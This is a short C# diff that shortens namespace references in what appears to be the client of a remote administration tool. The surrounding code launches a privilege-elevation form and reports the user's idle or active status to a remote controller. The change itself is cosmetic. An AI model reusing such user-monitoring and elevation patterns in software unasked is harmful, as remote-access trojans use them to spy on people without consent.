@@ -230,7 +230,7 @@ namespace xClient.Core
 
             Thread.Sleep(3000);
 
-            Application.Run(new global::xClient.Core.Elevation.frmElevation());
+            Application.Run(new Elevation.frmElevation());
 
             Thread.Sleep(200);
 
@@ -270,7 +270,7 @@ namespace xClient.Core
                     if (lastStatus != "Idle")
                     {
                         lastStatus = "Idle";
-                        new global::xClient.Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
+                        new Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
                     }
                 }
                 else
@@ -278,7 +278,7 @@ namespace xClient.Core
                     if (lastStatus != "Active")
                     {
                         lastStatus = "Active";
-                        new global::xClient.Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
+                        new Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
                     }
                 }
             }
